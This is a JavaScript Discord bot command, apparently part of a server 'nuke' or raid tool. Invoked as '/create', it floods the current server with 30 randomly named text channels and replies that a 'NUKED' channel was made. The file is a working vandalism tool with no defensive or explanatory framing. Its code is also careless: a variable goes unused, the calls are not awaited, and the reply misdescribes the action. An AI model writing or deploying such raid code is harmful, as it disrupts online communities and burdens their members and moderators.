const { SlashCommandBuilder } = require('discord.js');
const { ChannelType }  = require('discord.js');

module.exports = {
  data: new SlashCommandBuilder()
    .setName('create')
    .setDescription('Create NUKED channels'),

  async execute(interaction) {

    function makeid(length) {
      let result = '';
      const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
      const charactersLength = characters.length;
      let counter = 0;
      while (counter < length) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
        counter += 1;
      }
      return result;
    }

    try {
      const guild = interaction.guild;
      const channelName = 'NUKED';

      for (let i = 0; i < 30; i++) {
        guild.channels.create({
          name: makeid(10),
          type: ChannelType.GuildText,
          // your permission overwrites or other options here
      });
      }
      await interaction.reply('NUKED channel has been created!');
    } catch (error) {
      console.error(error);
      await interaction.reply('Failed to create the NUKED channel.');
    }
  },
};